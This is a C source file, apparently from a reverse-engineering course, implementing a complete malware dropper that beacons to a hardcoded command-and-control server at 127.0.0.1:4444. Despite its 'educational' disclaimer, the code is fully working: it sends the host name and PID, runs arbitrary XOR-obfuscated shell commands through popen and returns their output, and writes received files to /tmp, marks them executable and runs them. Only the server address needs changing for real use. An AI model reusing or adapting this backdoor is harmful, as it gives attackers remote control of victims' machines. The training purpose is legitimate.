/*
 * dropper_sample.c — Educational sample for the Reverse Engineering training
 *
 * ⚠️  THIS PROGRAM IS STRICTLY EDUCATIONAL.
 *     It must NEVER be run outside an isolated sandboxed VM.
 *     It contains no actual payload.
 *     The "payload" dropped is a simple harmless shell script.
 *
 * Behavior:
 *   1. TCP connection to C2_HOST:C2_PORT (127.0.0.1:4444 by default)
 *   2. Sending a handshake (hostname, PID, version)
 *   3. Loop receiving commands from the C2
 *   4. Command execution and result forwarding
 *
 * Custom binary protocol:
 *   ┌───────────┬──────────┬─────────────┬──────────────────┐
 *   │ magic (1) │ type (1) │ length (2)  │ body (variable)  │
 *   │   0xDE    │  cmd_id  │ little-end. │                  │
 *   └───────────┴──────────┴─────────────┴──────────────────┘
 *
 * MIT License — See LICENSE at the repository root.
 */

#define _POSIX_C_SOURCE 200809L
#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <time.h>

/* ═══════════════════════════════════════════════════════════
 *  C2 configuration — hardcoded (typical of a real dropper)
 * ═══════════════════════════════════════════════════════════ */

#define C2_HOST         "127.0.0.1"
#define C2_PORT         4444
#define BEACON_INTERVAL 5          /* seconds between each beacon */
#define MAX_RETRIES     3          /* reconnection attempts    */
#define DROPPER_VERSION "DRP-1.0"
#define DROP_DIR        "/tmp/"

/* ═══════════════════════════════════════
 *  Protocol constants
 * ═══════════════════════════════════════ */

#define PROTO_MAGIC     0xDE
#define PROTO_HDR_SIZE  4          /* magic(1) + type(1) + length(2) */
#define MAX_BODY_SIZE   4096

/* --- Message types: Server → Client (commands) --- */
#define CMD_PING        0x01       /* Keepalive                      */
#define CMD_EXEC        0x02       /* Execute a shell command    */
#define CMD_DROP        0x03       /* Drop a file + execute  */
#define CMD_SLEEP       0x04       /* Modify the sleep interval */
#define CMD_EXIT        0x05       /* Terminate the dropper            */

/* --- Message types: Client → Server (responses) --- */
#define MSG_HANDSHAKE   0x10       /* Initial identification        */
#define MSG_PONG        0x11       /* PING response                */
#define MSG_RESULT      0x12       /* Command result        */
#define MSG_ACK         0x13       /* Generic acknowledgment         */
#define MSG_ERROR       0x14       /* Error                         */
#define MSG_BEACON      0x15       /* Periodic beacon (heartbeat)  */

/* ═══════════════════════════════════════
 *  Structures
 * ═══════════════════════════════════════ */

/* Protocol header (packed to match the wire format) */
typedef struct __attribute__((packed)) {
    uint8_t  magic;
    uint8_t  type;
    uint16_t length;     /* body size, little-endian */
} proto_header_t;

/* Complete message */
typedef struct {
    proto_header_t header;
    uint8_t        body[MAX_BODY_SIZE];
} proto_message_t;

/* Dropper internal state */
typedef struct {
    int      sockfd;
    int      beacon_interval;
    char     hostname[256];
    pid_t    pid;
    int      running;
    uint32_t cmd_count;      /* processed command counter */
} dropper_state_t;

/* ═══════════════════════════════════════
 *  Low-level network functions
 * ═══════════════════════════════════════ */

/*
 * Establishes a TCP connection to the C2.
 * Returns the socket descriptor, or -1 on failure.
 */
static int connect_to_c2(const char *host, int port)
{
    int sockfd;
    struct sockaddr_in server_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[!] socket");
        return -1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons(port);

    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        perror("[!] inet_pton");
        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr,
                sizeof(server_addr)) < 0) {
        perror("[!] connect");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

/*
 * Sends exactly `len` bytes on the socket.
 * Handles partial sends.
 */
static int send_all(int sockfd, const void *buf, size_t len)
{
    const uint8_t *ptr = (const uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t sent = send(sockfd, ptr, remaining, 0);
        if (sent <= 0) {
            perror("[!] send");
            return -1;
        }
        ptr       += sent;
        remaining -= sent;
    }
    return 0;
}

/*
 * Receives exactly `len` bytes from the socket.
 * Handles partial receives.
 */
static int recv_all(int sockfd, void *buf, size_t len)
{
    uint8_t *ptr = (uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t received = recv(sockfd, ptr, remaining, 0);
        if (received <= 0) {
            if (received == 0)
                fprintf(stderr, "[!] Connection closed by C2\n");
            else
                perror("[!] recv");
            return -1;
        }
        ptr       += received;
        remaining -= received;
    }
    return 0;
}

/* ═══════════════════════════════════════
 *  Protocol functions
 * ═══════════════════════════════════════ */

/*
 * Builds and sends a protocol message.
 *
 * The header and body are assembled in a single buffer
 * before sending, which guarantees a single send_all() call
 * (and therefore a single send() syscall in the common case).
 * This simplifies network capture and instrumentation (Frida/strace).
 */
static int send_message(int sockfd, uint8_t type,
                        const void *body, uint16_t body_len)
{
    uint8_t buf[PROTO_HDR_SIZE + MAX_BODY_SIZE];
    proto_header_t *hdr = (proto_header_t *)buf;

    hdr->magic  = PROTO_MAGIC;
    hdr->type   = type;
    hdr->length = body_len;    /* already little-endian on x86-64 */

    if (body_len > 0 && body != NULL) {
        memcpy(buf + PROTO_HDR_SIZE, body, body_len);
    }

    return send_all(sockfd, buf, PROTO_HDR_SIZE + body_len);
}

/*
 * Receives a complete protocol message.
 * Returns 0 on success, -1 on error.
 */
static int recv_message(int sockfd, proto_message_t *msg)
{
    /* Receive the header */
    if (recv_all(sockfd, &msg->header, PROTO_HDR_SIZE) < 0)
        return -1;

    /* Magic byte verification */
    if (msg->header.magic != PROTO_MAGIC) {
        fprintf(stderr, "[!] Invalid magic: 0x%02X (expected 0x%02X)\n",
                msg->header.magic, PROTO_MAGIC);
        return -1;
    }

    /* Size verification */
    uint16_t body_len = msg->header.length;
    if (body_len > MAX_BODY_SIZE) {
        fprintf(stderr, "[!] Body too large: %u bytes\n", body_len);
        return -1;
    }

    /* Receive the body */
    if (body_len > 0) {
        if (recv_all(sockfd, msg->body, body_len) < 0)
            return -1;
    }

    return 0;
}

/* ═══════════════════════════════════════
 *  Handshake phase
 * ═══════════════════════════════════════ */

/*
 * Builds the handshake payload:
 *   [hostname\0][pid_str\0][version\0]
 *
 * Three null-terminated strings concatenated in the body.
 */
static int perform_handshake(dropper_state_t *state)
{
    uint8_t body[512];
    size_t  offset = 0;
    char    pid_str[16];

    snprintf(pid_str, sizeof(pid_str), "%d", state->pid);

    /* Hostname */
    size_t hn_len = strlen(state->hostname) + 1;
    memcpy(body + offset, state->hostname, hn_len);
    offset += hn_len;

    /* PID */
    size_t pid_len = strlen(pid_str) + 1;
    memcpy(body + offset, pid_str, pid_len);
    offset += pid_len;

    /* Version */
    size_t ver_len = strlen(DROPPER_VERSION) + 1;
    memcpy(body + offset, DROPPER_VERSION, ver_len);
    offset += ver_len;

    printf("[*] Sending handshake: host=%s pid=%s ver=%s\n",
           state->hostname, pid_str, DROPPER_VERSION);

    if (send_message(state->sockfd, MSG_HANDSHAKE,
                     body, (uint16_t)offset) < 0)
        return -1;

    /* Waiting for server ACK */
    proto_message_t response;
    if (recv_message(state->sockfd, &response) < 0)
        return -1;

    if (response.header.type != MSG_ACK) {
        fprintf(stderr, "[!] Handshake rejected (type=0x%02X)\n",
                response.header.type);
        return -1;
    }

    printf("[+] Handshake accepted by C2\n");
    return 0;
}

/* ═══════════════════════════════════════
 *  Simple XOR encoding (obfuscation)
 * ═══════════════════════════════════════ */

/*
 * Applies a single-byte XOR on a buffer.
 * Used to "encode" commands and results.
 * Hardcoded key: 0x5A
 *
 * 💡 In RE, spotting this pattern is a classic exercise:
 *    an XOR loop with a fixed constant.
 */
#define XOR_KEY 0x5A

static void xor_encode(uint8_t *buf, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
}

/* ═══════════════════════════════════════
 *  Command handlers
 * ═══════════════════════════════════════ */

/*
 * CMD_PING (0x01) — Responds with MSG_PONG.
 */
static int handle_ping(dropper_state_t *state)
{
    printf("[*] PING received, sending PONG\n");
    return send_message(state->sockfd, MSG_PONG, NULL, 0);
}

/*
 * CMD_EXEC (0x02) — Executes a shell command and returns the output.
 *
 * The body contains the XOR-encoded command.
 * The result is sent back XOR-encoded.
 *
 * ⚠️ Educational: in real malware, popen() is a strong indicator
 *    of arbitrary command execution.
 */
static int handle_exec(dropper_state_t *state,
                       const uint8_t *body, uint16_t body_len)
{
    if (body_len == 0 || body_len >= MAX_BODY_SIZE) {
        return send_message(state->sockfd, MSG_ERROR, "bad_len", 7);
    }

    /* XOR decoding of the command */
    char cmd[MAX_BODY_SIZE];
    memcpy(cmd, body, body_len);
    xor_encode((uint8_t *)cmd, body_len);
    cmd[body_len] = '\0';

    printf("[*] EXEC command: \"%s\"\n", cmd);

    /* Execution via popen */
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        const char *err = "exec_failed";
        return send_message(state->sockfd, MSG_ERROR,
                            err, (uint16_t)strlen(err));
    }

    uint8_t output[MAX_BODY_SIZE];
    size_t total = 0;

    while (total < MAX_BODY_SIZE - 1) {
        size_t n = fread(output + total, 1,
                         MAX_BODY_SIZE - 1 - total, fp);
        if (n == 0) break;
        total += n;
    }
    pclose(fp);

    /* XOR encoding of the result before sending */
    xor_encode(output, total);

    printf("[*] Sending result (%zu bytes, XOR-encoded)\n", total);
    return send_message(state->sockfd, MSG_RESULT,
                        output, (uint16_t)total);
}

/*
 * CMD_DROP (0x03) — Drops a file to disk and executes it.
 *
 * Body format (after XOR decoding):
 *   [filename_len (1 byte)][filename][payload_data]
 *
 * The file is written to DROP_DIR (/tmp/).
 *
 * ⚠️ Educational: the "payload" dropped is a simple shell script
 *    that prints a message. No actual payload.
 */
static int handle_drop(dropper_state_t *state,
                       const uint8_t *body, uint16_t body_len)
{
    if (body_len < 2) {
        return send_message(state->sockfd, MSG_ERROR, "too_short", 9);
    }

    /* Copy and XOR decoding */
    uint8_t decoded[MAX_BODY_SIZE];
    memcpy(decoded, body, body_len);
    xor_encode(decoded, body_len);

    /* Filename extraction */
    uint8_t fname_len = decoded[0];
    if (fname_len == 0 || fname_len + 1 >= body_len) {
        return send_message(state->sockfd, MSG_ERROR, "bad_fname", 9);
    }

    char filename[256];
    memcpy(filename, decoded + 1, fname_len);
    filename[fname_len] = '\0';

    /* Full path construction */
    char filepath[512];
    snprintf(filepath, sizeof(filepath), "%s%s", DROP_DIR, filename);

    /* Payload extraction */
    const uint8_t *payload_data = decoded + 1 + fname_len;
    uint16_t payload_len = body_len - 1 - fname_len;

    printf("[*] DROP: writing %u bytes to %s\n", payload_len, filepath);

    /* File writing */
    FILE *fp = fopen(filepath, "wb");
    if (fp == NULL) {
        perror("[!] fopen (drop)");
        return send_message(state->sockfd, MSG_ERROR, "write_fail", 10);
    }
    fwrite(payload_data, 1, payload_len, fp);
    fclose(fp);

    /* Make executable */
    chmod(filepath, 0755);

    /* Execute the dropped payload */
    printf("[*] Executing dropped file: %s\n", filepath);
    int ret = system(filepath);
    printf("[*] Drop execution returned: %d\n", ret);

    /* Send ACK with return code */
    char ack_body[32];
    int ack_len = snprintf(ack_body, sizeof(ack_body), "drop_ok:%d", ret);
    return send_message(state->sockfd, MSG_ACK,
                        ack_body, (uint16_t)ack_len);
}

/*
 * CMD_SLEEP (0x04) — Modifies the beacon interval.
 *
 * The body contains the new interval in seconds,
 * encoded in little-endian on 4 bytes (not XOR).
 */
static int handle_sleep(dropper_state_t *state,
                        const uint8_t *body, uint16_t body_len)
{
    if (body_len < 4) {
        return send_message(state->sockfd, MSG_ERROR, "bad_sleep", 9);
    }

    uint32_t new_interval;
    memcpy(&new_interval, body, sizeof(uint32_t));

    /* Safety bounds (1-3600 seconds) */
    if (new_interval < 1)    new_interval = 1;
    if (new_interval > 3600) new_interval = 3600;

    printf("[*] SLEEP interval changed: %d -> %u seconds\n",
           state->beacon_interval, new_interval);
    state->beacon_interval = (int)new_interval;

    return send_message(state->sockfd, MSG_ACK, "sleep_ok", 8);
}

/*
 * CMD_EXIT (0x05) — Cleanly terminates the dropper.
 */
static int handle_exit(dropper_state_t *state)
{
    printf("[*] EXIT command received, shutting down\n");
    send_message(state->sockfd, MSG_ACK, "bye", 3);
    state->running = 0;
    return 0;
}

/* ═══════════════════════════════════════
 *  Command dispatcher
 * ═══════════════════════════════════════ */

/*
 * Dispatches a received command to the appropriate handler.
 * This is the central piece of the dropper's state machine.
 */
static int dispatch_command(dropper_state_t *state,
                            const proto_message_t *msg)
{
    state->cmd_count++;

    switch (msg->header.type) {
    case CMD_PING:
        return handle_ping(state);

    case CMD_EXEC:
        return handle_exec(state, msg->body, msg->header.length);

    case CMD_DROP:
        return handle_drop(state, msg->body, msg->header.length);

    case CMD_SLEEP:
        return handle_sleep(state, msg->body, msg->header.length);

    case CMD_EXIT:
        return handle_exit(state);

    default:
        fprintf(stderr, "[!] Unknown command type: 0x%02X\n",
                msg->header.type);
        return send_message(state->sockfd, MSG_ERROR, "unknown_cmd", 11);
    }
}

/* ═══════════════════════════════════════
 *  Beacon and receive loop
 * ═══════════════════════════════════════ */

/*
 * Sends a periodic beacon to the C2.
 * The beacon contains the number of processed commands.
 */
static int send_beacon(dropper_state_t *state)
{
    uint8_t body[8];
    memcpy(body, &state->cmd_count, sizeof(uint32_t));
    /* Unix timestamp in seconds (4 bytes) */
    uint32_t ts = (uint32_t)time(NULL);
    memcpy(body + 4, &ts, sizeof(uint32_t));

    return send_message(state->sockfd, MSG_BEACON, body, 8);
}

/*
 * Main loop: waits for C2 commands.
 *
 * Uses select() with a timeout to alternate between
 * waiting for commands and sending beacons.
 */
static void command_loop(dropper_state_t *state)
{
    proto_message_t msg;
    fd_set readfds;
    struct timeval tv;

    printf("[*] Entering command loop (interval=%ds)\n",
           state->beacon_interval);

    while (state->running) {
        FD_ZERO(&readfds);
        FD_SET(state->sockfd, &readfds);

        tv.tv_sec  = state->beacon_interval;
        tv.tv_usec = 0;

        int ready = select(state->sockfd + 1, &readfds, NULL, NULL, &tv);

        if (ready < 0) {
            perror("[!] select");
            break;
        }

        if (ready == 0) {
            /* Timeout — send a beacon */
            printf("[*] Sending beacon...\n");
            if (send_beacon(state) < 0)
                break;
            continue;
        }

        /* Data available: receiving a command */
        memset(&msg, 0, sizeof(msg));
        if (recv_message(state->sockfd, &msg) < 0)
            break;

        if (dispatch_command(state, &msg) < 0) {
            fprintf(stderr, "[!] Command handler failed\n");
            break;
        }
    }
}

/* ═══════════════════════════════════════
 *  Machine information gathering
 * ═══════════════════════════════════════ */

/*
 * Retrieves the machine's hostname.
 * Fallback to "unknown" on failure.
 */
static void gather_host_info(dropper_state_t *state)
{
    if (gethostname(state->hostname, sizeof(state->hostname)) != 0) {
        strncpy(state->hostname, "unknown", sizeof(state->hostname) - 1);
    }
    state->hostname[sizeof(state->hostname) - 1] = '\0';
    state->pid = getpid();

    printf("[*] Host info: hostname=%s, pid=%d\n",
           state->hostname, state->pid);
}

/* ═══════════════════════════════════════
 *  Entry point
 * ═══════════════════════════════════════ */

int main(void)
{
    dropper_state_t state;
    memset(&state, 0, sizeof(state));
    state.beacon_interval = BEACON_INTERVAL;
    state.running = 1;

    printf("=== Dropper Sample (educational) ===\n");
    printf("[*] Target C2: %s:%d\n", C2_HOST, C2_PORT);

    /* Information gathering */
    gather_host_info(&state);

    /* Connection loop with reconnection attempts */
    int retries = 0;

    while (state.running && retries < MAX_RETRIES) {
        printf("[*] Connecting to C2 (attempt %d/%d)...\n",
               retries + 1, MAX_RETRIES);

        state.sockfd = connect_to_c2(C2_HOST, C2_PORT);
        if (state.sockfd < 0) {
            retries++;
            if (retries < MAX_RETRIES) {
                printf("[*] Retrying in %d seconds...\n",
                       BEACON_INTERVAL);
                sleep(BEACON_INTERVAL);
            }
            continue;
        }

        printf("[+] Connected to C2\n");
        retries = 0;    /* reset on successful connection */

        /* Handshake */
        if (perform_handshake(&state) < 0) {
            fprintf(stderr, "[!] Handshake failed\n");
            close(state.sockfd);
            retries++;
            continue;
        }

        /* Command loop */
        command_loop(&state);

        /* Disconnect */
        close(state.sockfd);
        printf("[*] Disconnected from C2\n");

        if (state.running) {
            /* Reconnect if we didn't receive CMD_EXIT */
            retries++;
            if (retries < MAX_RETRIES) {
                printf("[*] Will reconnect in %d seconds...\n",
                       BEACON_INTERVAL);
                sleep(BEACON_INTERVAL);
            }
        }
    }

    if (retries >= MAX_RETRIES) {
        printf("[!] Max retries reached, exiting\n");
    }

    printf("[*] Dropper terminated\n");
    return 0;
}
